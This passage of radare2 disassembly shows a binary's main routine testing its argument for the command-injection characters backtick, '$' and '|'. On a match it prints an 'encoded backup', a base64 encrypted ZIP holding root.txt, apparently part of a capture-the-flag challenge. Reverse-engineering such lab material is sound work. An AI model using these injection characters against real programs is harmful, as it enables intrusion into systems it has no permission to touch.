str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x08048f89      e802f7ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048f8e      83c410         add esp, 0x10
|       |   0x08048f91      83ec0c         sub esp, 0xc
|       |   0x08048f94      6a00           push 0
|       |   0x08048f96      e825f7ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08048f6f (sym.main)
|       `-> 0x08048f9b      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08048f9e      83c00c         add eax, 0xc
|           0x08048fa1      8b00           mov eax, dword [eax]
|           0x08048fa3      83ec08         sub esp, 8
|           0x08048fa6      6a60           push 0x60                   ; '`' ; 96
|           0x08048fa8      50             push eax
|           0x08048fa9      e832f7ffff     call sym.imp.strchr         ; char*strchr(char *s, int c)
|           0x08048fae      83c410         add esp, 0x10
|           0x08048fb1      85c0           test eax, eax
|       ,=< 0x08048fb3      742a           je 0x8048fdf
|       |   0x08048fb5      83ec0c         sub esp, 0xc
|       |   0x08048fb8      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x08048fbd      e8bdf9ffff     call sym.displaySuccess
|       |   0x08048fc2      83c410         add esp, 0x10
|       |   0x08048fc5      83ec0c         sub esp, 0xc
|       |   0x08048fc8      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x08048fcd      e8bef6ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048fd2      83c410         add esp, 0x10
|       |   0x08048fd5      83ec0c         sub esp, 0xc
|       |   0x08048fd8      6a00           push 0
|       |   0x08048fda      e8e1f6ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08048fb3 (sym.main)
|       `-> 0x08048fdf      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08048fe2      83c00c         add eax, 0xc
|           0x08048fe5      8b00           mov eax, dword [eax]
|           0x08048fe7      83ec08         sub esp, 8
|           0x08048fea      6a24           push 0x24                   ; '$' ; 36
|           0x08048fec      50             push eax
|           0x08048fed      e8eef6ffff     call sym.imp.strchr         ; char*strchr(char *s, int c)
|           0x08048ff2      83c410         add esp, 0x10
|           0x08048ff5      85c0           test eax, eax
|       ,=< 0x08048ff7      742a           je 0x8049023
|       |   0x08048ff9      83ec0c         sub esp, 0xc
|       |   0x08048ffc      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x08049001      e879f9ffff     call sym.displaySuccess
|       |   0x08049006      83c410         add esp, 0x10
|       |   0x08049009      83ec0c         sub esp, 0xc
|       |   0x0804900c      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA ; 0x80498d0 ; "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA=="
|       |   0x08049011      e87af6ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08049016      83c410         add esp, 0x10
|       |   0x08049019      83ec0c         sub esp, 0xc
|       |   0x0804901c      6a00           push 0
|       |   0x0804901e      e89df6ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08048ff7 (sym.main)
|       `-> 0x08049023      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08049026      83c00c         add eax, 0xc
|           0x08049029      8b00           mov eax, dword [eax]
|           0x0804902b      83ec08         sub esp, 8
|           0x0804902e      6a7c           push 0x7c                   ; '|' ; 124
|           0x08049030      50             push eax
|           0x08049031      e8aaf6ffff     call sym.imp.strchr         ; char*strchr(char *s, int c)
|           0x08049036      83c410         add esp, 0x10
|           0x08049039      85c0           test eax, eax
|       ,=< 0x0804903b      742a           je 0x8049067
|       |   0x0804903d      83ec0c         sub esp, 0xc
|       |   0x08049040      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x08049045      e835f9ffff     call sym.displaySuccess
|       |   0x0804904a      83c410         add esp, 0x10
|       |   0x0804904d      83ec0c         sub esp, 0xc
|       |   0x08049050      68d0980408     push str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKE ; str.UEsDBDMDAQBjAG__IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH_hu0fArpSvYauq4AUycRmLuWvPyJk3sF_HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK_oan4wWPabhw_2rwaaJSXucU_pLgZorY67Q_Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE_ZiS1S_rPgz_e2Pc3lgkQ_lAVBqjo4zmpQltgIXauCdhvlA1Pe_BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF_rQhDCKsAEhqQ_Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP_Yhgo4OAghyW1sgV8FxenV8p5c_u9bTBTz_7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY_a4AZKO_GtVMULlrpbpIFqZ98zwmROFstmPl_cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO_wXrd_EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA_jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK_kP4F0eR_53a4dSL0b6xFnbL7WwRpcF_Ate_Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP_jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ_hytQdd26PCuhmRUyNjEIBFx_XqkSOfAhLI9_Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2_F_X_OD_s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB_nEGeq_sdtifdUGeFLct_Ee2pgR_AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg_RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn_8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i_4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38__8xdqAcdEGXJBR2RT1TlxG_YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn_C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD_tgtUHcFBLAQI_AzMDAQBjAG__IksAAAAA7